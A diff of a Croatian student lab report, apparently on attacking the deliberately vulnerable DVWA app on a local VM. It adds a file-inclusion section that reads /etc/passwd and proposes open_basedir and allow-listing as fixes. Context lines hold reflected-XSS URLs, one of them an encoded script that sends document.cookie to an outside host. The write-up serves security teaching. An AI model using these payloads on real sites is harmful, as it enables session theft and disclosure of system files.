@@ -81,3 +81,28 @@ Za napade na stranici „XSS (Reflected)” sam koristio istovjetne skripte:
 http://192.168.56.101/vulnerabilities/xss_r/?name=<script>alert(document.cookie)<%2Fscript>
 
 http://192.168.56.101/vulnerabilities/xss_r/?name=%3Cscript%3E%7B+const+params+%3D+new+URLSearchParams%28%29%3B+params.set%28%27cookie%27%2C+document.cookie%29%3B+fetch%28%27http%3A%2F%2Fpublic.tel.fer.hr%2Fsrs%3F%27+%2B+params.toString%28%29%2C+%7Bmode%3A+%27no-cors%27%7D%29%3B+%7D%3C%2Fscript%3E
+
+
++------------------------------------------+
+| 4) Inkluzija datoteka (File inclusion)   |
++------------------------------------------+
+
+Koristio sam URL „http://192.168.56.101/vulnerabilities/fi/?page=/etc/passwd”.
+Moguće je ispisati tu datoteku jer poslužitelj čita datoteku s putanjom zadanom
+parametrom, interpretira ju kao PHP skriptu i rezultat izvršavanja šalje
+klijentu.  Jezik PHP sav sadržaj datoteke izvan <?php ?> oznaka prosljeđuje
+na izlaz bez ikakve obrade, pa kako datoteka /etc/passwd ne sadržava takve
+oznake se ona u potpunosti ispisuje u izvorni kod poslužene stranice.  Slika
+zaslona je priložena kao datoteka „zad4.png”.
+
+Jedan način kako bih aplikaciju zaštitio od napada jest uključivanjem opcije
+„open_basedir” kojom se definira direktorij unutar kojeg PHP smije otvarati
+datoteke.  Tom opcijom bih PHP-u naredio da odbija otvoriti datoteku izvan
+direktorija u kojem se nalazi izvorni kod aplikacije.
+
+Najbolje rješenje za ovaj napad je ipak onemogućiti da klijenti mogu zadavati
+imena datoteka koje će se izvršavati.  Ukoliko je potrebna slična
+funkcionalnost, moguće je izmijeniti implementaciju da klijent kao parametar
+umjesto imena datoteke prosljeđuje jednu od unaprijed određenih konstanti.
+Poslužitelj bi zatim na temelju tog parametra iz unaprijed definiranog popisa
+PHP datoteka birao koju od njih uključiti.
